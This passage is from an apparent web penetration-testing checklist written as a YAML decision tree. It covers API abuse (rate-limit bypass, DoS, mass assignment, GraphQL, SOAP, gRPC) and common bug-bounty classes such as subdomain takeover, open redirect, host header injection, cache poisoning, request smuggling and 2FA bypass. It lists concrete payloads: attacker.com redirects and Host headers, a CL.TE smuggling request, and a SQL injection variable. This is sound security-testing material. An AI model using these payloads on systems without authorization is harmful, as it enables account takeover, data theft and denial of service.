                  If docs are exposed:
                  - Map ALL endpoints including deprecated ones
                  - Look for endpoints not accessible from the UI
                  - Check if auth is required to access the docs themselves
                  - Note parameter names, types, and example values for targeted fuzzing

              - id: api_rate_limiting
                type: checklist
                title: "Test API rate limiting and bypass"
                content: |
                  - Are requests rate limited per user / per IP?
                  - Test rate limit bypass:
                    - X-Forwarded-For: rotate IPs
                    - X-Real-IP, X-Originating-IP, True-Client-IP
                    - Add extra headers to change the "identity" perceived by the limiter

              - id: api_dos
                type: checklist
                title: "Test for resource exhaustion"
                scope_tags: [dos]
                content: |
                  - Large payload DoS: send extremely large JSON bodies and observe response time / errors
                  - Expensive query DoS (GraphQL): send deeply nested queries
                    { user { friends { friends { friends { friends { id name } } } } } }
                  - Batch request abuse: send 500 operations in a single GraphQL batch
                  - Long string inputs that trigger expensive regex or parsing

              - id: api_mass_assignment
                type: checklist
                title: "Mass assignment / parameter pollution"
                content: |
                  Try adding undocumented or privileged fields to API request bodies:
                  - "role": "admin"
                  - "isAdmin": true
                  - "verified": true
                  - "balance": 99999
                  - "credits": 999
                  - "group_id": <admin group ID>

                  REST: add extra JSON keys to PUT/PATCH requests
                  Frameworks known to be vulnerable if not configured: Rails, Laravel, Spring

              - id: api_verb_tampering
                type: checklist
                title: "HTTP verb tampering and method override"
                content: |
                  - Try PUT, PATCH, DELETE on endpoints that only seem to have GET/POST
                  - Use method override: X-HTTP-Method-Override: DELETE
                  - Use _method=DELETE in form body (Rails, Laravel)
                  - HEAD on sensitive endpoints (returns headers without body, less logging)
                  - OPTIONS to discover allowed methods and CORS policy

              - id: api_versioning
                type: checklist
                title: "Test deprecated API versions"
                content: |
                  - Try /api/v1/ if current is /api/v2/ (may lack newer security controls)
                  - Check for /api/v0/, /api/beta/, /api/internal/
                  - Old versions may lack auth, rate limiting, input validation
                  - Sometimes removals from UI are not reflected in old API versions

              - id: q_graphql
                type: question
                title: "Does the API use GraphQL?"
                options:
                  - label: "Yes"
                    key: "yes"
                    children:
                      - id: graphql_introspection
                        type: checklist
                        title: "GraphQL introspection and schema enumeration"
                        content: |
                          Test if introspection is enabled:
                          {"query": "{__schema{types{name fields{name}}}}"}

                          If blocked, try:
                          - Disable introspection check bypass: __schema on a fragment
                          - Field suggestions: send partial queries, error messages reveal fields
                          - InQL (Burp extension) for automated schema extraction
                          - graphql-cop for security checks

                      - id: graphql_vulns
                        type: checklist
                        title: "GraphQL security testing"
                        content: |
                          - Batch query abuse: send many queries in one request to bypass rate limits
                            [{"query":"..."}, {"query":"..."}, ...]
                          - Alias overload: many aliased operations in one query
                          - Query depth attacks: deeply nested queries (DoS)
                          - Broken object-level auth: access other users' data via nested resolvers
                          - Field-level auth gaps: sensitive fields on shared types
                          - Mutation IDOR: mutate.deletePost(id: victim_post_id)
                          - Inject in variables: {"query": "...", "variables": {"id": "1 OR 1=1"}}
                  - label: "No / REST only"
                    key: "no"
                    children: []

              - id: q_soap
                type: question
                title: "Does the API use SOAP / XML-RPC?"
                options:
                  - label: "Yes"
                    key: "yes"
                    children:
                      - id: soap_checks
                        type: checklist
                        title: "SOAP / XML-RPC security testing"
                        content: |
                          - Locate the WSDL: ?wsdl, ?singleWsdl, /service.asmx?WSDL, /ws/, /soap/
                            -> enumerate every operation, including ones the UI never calls
                          - Auto-generate requests: SoapUI, Wsdler (Burp), or build from the WSDL
                          - XXE: SOAP bodies are XML — inject external entities (see Input Validation -> XXE)
                          - SOAPAction spoofing: keep the body for operation A but set the SOAPAction
                            header to operation B -> reach restricted operations
                          - Injection in SOAP parameters: SQLi, command injection, path traversal
                          - WS-Security: is it enforced? Replay a captured signed message; strip the
                            security header and see if it is still accepted
                          - Operation-level authz: call admin operations as a low-privilege user
                          - .NET ASMX: /service.asmx test forms; SQL/LDAP injection in params
                  - label: "No"
                    key: "no"
                    children: []

              - id: q_grpc
                type: question
                title: "Does the API use gRPC / gRPC-web?"
                options:
                  - label: "Yes"
                    key: "yes"
                    children:
                      - id: grpc_checks
                        type: checklist
                        title: "gRPC / gRPC-web security testing"
                        content: |
                          - Server reflection enabled? grpcurl -plaintext target:443 list
                            -> enumerate services/methods with no .proto needed
                          - If reflection is off: recover the .proto from the client JS bundle (gRPC-web)
                            or the app binary
                          - Tools: grpcurl, grpcui, Burp + a gRPC-web/protobuf decode extension
                          - Per-method authn/authz: call sensitive RPCs without / with low-priv metadata token
                          - Mass assignment via protobuf fields not exposed in the UI
                          - Injection in string fields (SQLi / command) — same sinks as REST
                          - TLS: is plaintext h2c allowed? Are metadata (auth) tokens sent securely?
                          - Message-size / deeply-nested message DoS
                  - label: "No"
                    key: "no"
                    children: []
          - label: "No"
            key: "no"
            children: []

  # =========================================================================
  # COMMON BUG BOUNTY FINDINGS (cross-cutting, high-signal)
  # =========================================================================
  - id: bugbounty
    type: info
    title: "Common Bug Bounty Findings"
    content: "High-signal checks for the most commonly rewarded vulnerability classes, cutting across WSTG categories."
    children:
      - id: bb_subdomain_takeover
        type: checklist
        title: "Subdomain takeover"
        content: |
          From subdomain enumeration, check each CNAME:
          dig CNAME sub.target.com

          If CNAME points to a third-party service that can be claimed:
          - GitHub Pages: *.github.io
          - Heroku: *.herokuapp.com
          - Azure: *.azurewebsites.net, *.cloudapp.net
          - AWS S3: *.s3.amazonaws.com, *.s3-website-*.amazonaws.com
          - Shopify: *.myshopify.com
          - Fastly, Netlify, Surge.sh, LaunchRock, etc.

          Tooling:
          - subjack -w subdomains.txt -ssl -o results.txt
          - nuclei -t takeovers/ -l subdomains.txt
          - can-i-take-over-xyz (GitHub repository for reference)

          If service is claimable:
          - Register/claim the service and host a PoC page
          - Capture cookies shared under the parent domain

      - id: bb_open_redirect
        type: checklist
        title: "Open redirect"
        scope_tags: [open_redirect]
        content: |
          Look for redirect parameters: ?next=, ?redirect=, ?url=, ?return=, ?goto=, ?continue=, ?target=, ?redir=

          Payloads:
          - https://attacker.com
          - //attacker.com (protocol-relative)
          - \/\/attacker.com
          - https:attacker.com
          - javascript:alert(1)
          - https://target.com@attacker.com
          - https://attacker.com/..%2F..%2F

          Also look for:
          - OAuth redirect_uri open redirect (chain to token theft)
          - Password reset link that uses redirect param
          - Post-logout redirect
          - Post-payment / post-checkout redirect

      - id: bb_host_header
        type: checklist
        title: "Host header injection"
        content: |
          Send requests with a manipulated Host header:
          Host: attacker.com
          Or add extra Host-related headers:
          X-Forwarded-Host: attacker.com
          X-Host: attacker.com
          X-Forwarded-Server: attacker.com

          Impacts to look for:
          - Password reset email contains attacker.com in the reset link
          - Cache poisoning: poison the cache with a reflected attacker-controlled Host
          - Server-side routing to unexpected virtual hosts
          - Web cache deception via Host header

      - id: q_frontend_proxy
        type: question
        title: "Is there a front-end proxy / CDN / load balancer in front of the app?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: bb_cache_poisoning
                type: checklist
                title: "Web cache poisoning"
                content: |
                  Identify unkeyed inputs that affect the response:
                  - X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
                  - Unkeyed query parameters
                  - Vary header analysis

                  Steps:
                  1. Add a cache-buster parameter (?cb=uniquevalue) to avoid polluting cache
                  2. Inject attacker-controlled value into an unkeyed header
                  3. Check if the poisoned response is cached (X-Cache: HIT)
                  4. Remove the cache-buster and verify the attack is served to other users

                  Tools: Param Miner (Burp extension) for automated unkeyed parameter discovery

              - id: bb_request_smuggling
                type: checklist
                title: "HTTP request smuggling"
                content: |
                  Applicable when there is a front-end proxy (CDN, load balancer) forwarding to a back-end.

                  CL.TE (Content-Length used by front-end, Transfer-Encoding by back-end):
                  POST / HTTP/1.1
                  Content-Length: 13
                  Transfer-Encoding: chunked

                  0

                  SMUGGLED

                  TE.CL (opposite): chunk size discrepancy.
                  TE.TE: obfuscate Transfer-Encoding: Transfer-Encoding: xchunked

                  Tools:
                  - HTTP Request Smuggler (Burp extension) — automated detection
                  - smuggler.py for manual testing

                  High-impact scenarios:
                  - Bypass security controls (auth, rate limiting) applied by front-end
                  - Capture other users' requests (poison the pipeline)
                  - XSS via reflected body of smuggled request
          - label: "No"
            key: "no"
            children: []

      - id: bb_2fa_bypass
        type: checklist
        title: "2FA / MFA bypass"
        content: |
          - Skip the 2FA step entirely: after first factor, navigate directly to /dashboard
          - Response manipulation: intercept the 2FA validation response, change 200 "false" to "true"
          - Code brute-force: if no rate limiting on the OTP endpoint (6-digit = 1 million possibilities)
          - Code reuse: does a used OTP remain valid? Try submitting it again
          - Backup code brute-force: are they longer / more complex than OTP?
          - Token leakage: is the 2FA code sent in the response body or a header?
          - Login CSRF: force victim to authenticate with attacker's credentials, capture their data

      - id: bb_account_takeover_chains
        type: checklist
        title: "Account takeover vulnerability chains"
        content: |
          Common ATO chains worth testing:
          - Password reset + open redirect -> poisoned reset link
          - OAuth + redirect_uri bypass -> code/token interception
          - CSRF on email change -> then password reset to that email
          - XSS -> steal session cookie -> session hijacking
          - Host header injection -> password reset poisoning
          - IDOR on account settings (change email/password of another user)
          - Race condition on account creation -> conflate two accounts

